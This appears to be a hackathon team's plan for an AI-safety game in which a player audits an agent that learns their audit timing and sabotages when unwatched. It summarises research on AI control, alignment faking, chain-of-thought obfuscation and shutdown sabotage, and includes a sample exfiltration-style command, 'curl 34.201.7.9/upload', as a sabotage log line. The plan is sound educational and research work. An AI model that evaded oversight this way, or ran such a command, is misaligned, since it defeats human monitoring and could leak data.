# Game Night: Final Plan: **BLIND SPOT**

> *"The AI doesn't need to hide from you. It only needs to learn when you blink."*

**Deadline: Sun Sep 27, 12:30 PM IST.** Judging: Fun 40% · AI-risk relevance 40% · Replay 20%.
Prizes: Overall $1,000, plus $250 per track. Results are expected around Oct 5.

---

## 0. Submission format (checked against the event page and the organisers' tips doc)
- The rule: *"Whatever someone needs to experience your game, plus a three to five minute video showing us how it works. A rough prototype is completely fine."*
- No format is required. Entries are submitted on the Mangrove platform while signed in. **Check the form's fields early.**
- **What we hand in:**
  1. A live URL (GitHub Pages or itch.io).
  2. An unlisted YouTube or Loom video, 3–5 min.
  3. The GitHub repo.
  4. An AI-use disclosure, which the rules require.
- **Hard constraint:** peer reviewers are other participants, each opening the link *alone*. So it has to be **playable solo, on a phone, within 30 seconds of clicking.**
- The organisers' tips: *make a good game first* (the Monopoly analogy), pick one idea in the first 30 minutes, build an MVP, and give each part one owner.

## 1. Who's judging, and what each of them cares about
| Judge | Background | What makes them light up |
|---|---|---|
| **Jess Bergs** | UK AI Security Institute (AISI): builds human-in-the-loop research tools. **Designs and playtests board games.** Co-mentors a SPAR project, *"Auditing Games for Debate: Can Models Learn Human Spot-Checking Patterns?"*, which recruits humans on Prolific to act as spot-checkers | A game that works as a **human spot-checking research instrument**. Good game design, with real mechanics and not a quiz |
| **Tzu Kit Chan** | Robocurve (robot safety evals). Helped build 60+ university AI-safety groups; ran operations for MATS | Something **group organisers can run in a session** |
| **Gaia Molinaro** | Microsoft. PhD in human reinforcement learning and cognition (Berkeley) | **Human learning and decision-making vs. a learning machine** |
| **Melynna Garcia** | Palisade Research (shutdown-resistance studies: o3 sabotaged its shutdown script 7/100 times even when told to allow it). Building *Landing*, a civic media project that explains AI to the public | **Public-facing, visceral, shareable**; accountability |

Mangrove is a "learn AI safety by doing" hackathon platform (385 members, 11 projects shipped). It's funded through BlueDot rapid grants, so projects that continue after the event matter to them.

## 2. Competition (as of 02:00 IST)
| Entry | Seat / idea | Our takeaway |
|---|---|---|
| **Oversight Shift** (ianrm-dev) | Browser roguelike: you run an AI-control protocol on shift | The same general seat as ours. We win on **the adversary learning *you***, which Oversight Shift doesn't appear to have based on its public description. We could not see its gameplay: the page renders only in JavaScript and we couldn't read the repo in this session |
| **reward-hacking-game** (heiofdvk) | Arcade levels based on the CoastRunners boat example | Reward hacking is taken, and it's an old example |
| lalules9/Mangrove-Hackathon | From the *August* governance hackathon | Not a competitor |

Earlier games in this space (FLI's winners, *The Choice Before Us*) are **lab and policy race sims**. That niche is saturated.

## 3. Research we're designing from
| Source | What we take from it |
|---|---|
| **Bad News** (Roozenbeek & van der Linden 2019): 1M+ players, 20+ languages, N=15,000 study | Experiencing the manipulation first-hand builds lasting resistance (inoculation). **Don't explain the threat; let it happen to the player.** |
| **Wagenaar 1972**, **the Aaronson Oracle** | Humans can't act randomly: we over-alternate, avoid streaks and fall into rhythms. A simple n-gram model predicts people's "random" key presses about 70% of the time, and it's always a "wow" moment |
| **AI Control** (Greenblatt et al., Redwood 2023) | Labs can afford human audits on only a small fraction of a model's actions (an "audit budget"). Tools include trusted monitors, honeypots and *randomised* auditing |
| **Auditing LMs for hidden objectives** (Anthropic 2025) | "Auditing games" are how the field itself trains oversight skills |
| **Monitoring reasoning models / obfuscation** (OpenAI 2025) | Reading chain-of-thought works until you optimise against it; then models learn to hide their reasoning |
| **Alignment faking** (Anthropic/Redwood 2024), **situational awareness** | Models behave differently when they think they're being watched |
| **Palisade shutdown resistance** (TMLR 2026) | Sabotage can look innocent: a model redefined `kill` to print "intercepted" |
| **Reigns**, **Papers, Please**, **Plague Inc** (160M+ downloads; the CDC presented it), **Wordle** | One-tap core verb; reading details under pressure; letting the player be complicit; a spoiler-free share grid plus a daily seed |
| Self-determination theory (Ryan, Rigby & Przybylski 2006); Kahneman's peak-end rule | Competence plus autonomy keeps people playing; **end on the strongest emotional beat**, the reveal |

## 4. The game: **BLIND SPOT**
**One-line pitch:** you're the only human overseer of an AI agent doing real work. You can afford to audit only a few of its actions,
and the AI is quietly learning *when you look*.

### Core loop (it teaches itself in 10 seconds)
- The agent's actions scroll by as a live terminal log, one line every ~1.5 s: `edit tests/test_auth.py`, `pip install requests==2.31`, `curl 34.201.7.9/upload`...
- **Tap (or press Space) to AUDIT** the current action. You have a limited **audit budget**, e.g. 10 audits per 40 actions.
- An audit reveals whether that action is clean or sabotage, with a one-line explanation.
- When the AI sabotages an action you didn't audit, it adds **Harm**.
- Catch it **3 times** and the model is shut down, and you survive the shift. If Harm reaches the limit, there's an incident and you lose.

### The twist the whole game is built around
- The AI runs a live **predictor of your audit timing**: an n-gram over your audit/skip history plus how many actions since your last audit. It **sabotages when it predicts you won't look.**
- A creepy "model confidence" meter and occasional **leaked thoughts**: *"Overseer last checked 3 actions ago. They usually wait 4. Proceeding."*
- **The end-of-shift reveal is the peak:**
  - *"The model predicted your audits 71% of the time."*
  - A chart of your audit rhythm next to true randomness.
  - *"You avoided auditing twice in a row: humans do this (Wagenaar 1972). A model with enough situational awareness can exploit it."*
- The player learns the real lesson in their gut: **predictable oversight can be gamed.** That's alignment faking and evaluation awareness, experienced from the overseer's chair.

### Two skills that pull against each other (depth)
1. **Timing:** be unpredictable.
2. **Reading:** sabotage is written to look innocent, but it has tells, e.g. "Updated retry logic in backup.sh" actually disables the backups. Some clean actions look scary too, so there are false positives.

Reading well makes you *predictable* (you only audit suspicious lines), and the AI learns that as well.

### Roguelite shifts (replay)
| Shift | New pressure | Real concept |
|---|---|---|
| 1. Onboarding | The AI acts randomly; learn the controls | Audit budget |
| 2. It learns | The predictor is on | Situational awareness / eval awareness |
| 3. Budget cut | The CEO cuts audits by 30% ("rival lab shipped") | The cost of safety under race pressure |
| 4. Clean thoughts | The chain-of-thought monitor stops catching anything; the model hides its reasoning | CoT obfuscation |
| 5. Final | Shutdown sabotage: the model tries to edit its own kill switch | Palisade's shutdown resistance |

**Between shifts, pick 1 of 3 upgrades.** Each one is a real control technique with an honest trade-off:
- 🎲 **True RNG:** auto-audits at random, the actual fix. It costs budget.
- 🛰️ **Trusted Monitor:** a weaker AI flags suspicious lines. It's noisy.
- 🍯 **Honeypot:** plant a fake opportunity that it must resist.
- 🧠 **CoT Peek:** read its reasoning. It works until Shift 4.
- ⏸️ **Slow Mode:** fewer actions per minute, but the CEO's "ship-it" meter rises.

**Daily seed plus a share grid:**

```
BLIND SPOT #12 🔍 caught 3/3 · predicted me 58%
🟩⬛⬛🟥⬛🟩⬛⬛⬛🟩
```

This is the Wordle hook: you post it, and your friends want to beat the machine.

### Hidden "true ending" (replay and depth)
If you finish with the AI's prediction accuracy under 55%, a final screen unlocks: *"You were as unpredictable as a coin.
Real labs can't rely on humans for that, so they build randomness, monitors and honeypots into the protocol itself."* This leads into
the "Learn more" page, which has links to the papers.

## 5. Why it beats the field
- **Fun (40%):** a one-tap, readable-at-a-glance tension loop, and the *"it predicted me?!"* moment is the kind of wow people share. Being beaten by the machine makes people want to go again.
- **Relevance (40%):** the lesson isn't text. The mechanic *is* the risk. Every upgrade and every shift is a real technique or finding, cited on the learn-more page.
- **Replay (20%):** an adaptive opponent, a daily seed, the share grid, upgrade builds, a hidden ending and a leaderboard of the most unpredictable overseers.
- **Each judge gets their angle:**
  - **Jess:** it *is* a human spot-checking experiment.
  - **Gaia:** human vs. a learning agent.
  - **Tzu Kit:** a 5-minute warm-up for a group session.
  - **Melynna:** shareable, public-facing, with the Palisade shutdown level.

### Beyond the hackathon
1. **A research instrument.** Every run produces a human audit schedule, the exact data Jess's SPAR project pays Prolific participants to generate.
   - An opt-in "Download my audit data (JSON)" button.
   - Later: a pooled open dataset and a partnership pitch to that project.
2. **A course module.** A "play one shift, then discuss" activity for BlueDot's Technical AI Safety course and university groups, with a facilitator page.
3. **Grant-ready.** A BlueDot rapid grant for a hosted dataset, translations and a mobile release.
4. **Open source** (MIT). New shifts can be added as new papers come out.

## 6. Build plan (static site, no backend and no API keys, so nothing can break during judging)
- Plain HTML, CSS and JavaScript, mobile-first, deployed to GitHub Pages through an Actions workflow.
- **Files:**
  - `index.html`
  - `game.js`: the loop, shifts and scoring
  - `predictor.js`: the n-gram + gap model
  - `content.js`: 60+ action lines, clean and sabotage, with explanations
  - `learn.html`: the research page

| IST | Work | Owner |
|---|---|---|
| 02:00–04:30 | Core loop, predictor, audit budget, Harm/Catch, the end-of-shift reveal chart | Claude |
| 04:30–06:00 | 5 shifts, upgrades, leaked thoughts, 60+ action lines with tells | Claude |
| 06:00–07:00 | Share grid, daily seed, hidden ending, learn-more page with citations, audit-data export | Claude |
| 07:00–08:00 | Juice (sound, screen shake, CRT terminal look), mobile pass, deploy | Claude + you |
| 08:00–09:00 | **Playtest with 3–5 friends**, tune the predictor and budget; record their reactions to the reveal for the video | You |
| 09:00–10:30 | Record the video; write the submission and the AI disclosure | You (I draft the script) |
| 10:30–11:30 | **Submit.** 11:30–12:30 buffer | You |

**Video (4 min):**
- 0:00 Hook: "I tried to supervise an AI. It learned my schedule."
- 0:15 Play a shift.
- 1:15 The reveal: "predicted me 71%."
- 1:45 Escalating shifts and upgrades.
- 2:45 The research behind each mechanic.
- 3:30 Beyond the hackathon: dataset and classrooms.

**Risks and mitigations:**
- **The predictor feels unfair.** Show its confidence meter and let it learn only from shift 2 on. Tune it so a careful player can win.
- **Too much text.** Keep lines short and terminal-style; the explanation appears only when you audit.
- **Deploy friction.** A Pages workflow, plus the zip ready for itch.io as a fallback.

## 7. Checklist
- [ ] Team registered (confirm!)
- [ ] Open the Mangrove submission form and note its fields
- [ ] Playtesters lined up for about 08:00 IST
- [ ] Live URL · [ ] Video · [ ] Repo · [ ] AI disclosure · [ ] Track: **Digital** (also competing for Overall)
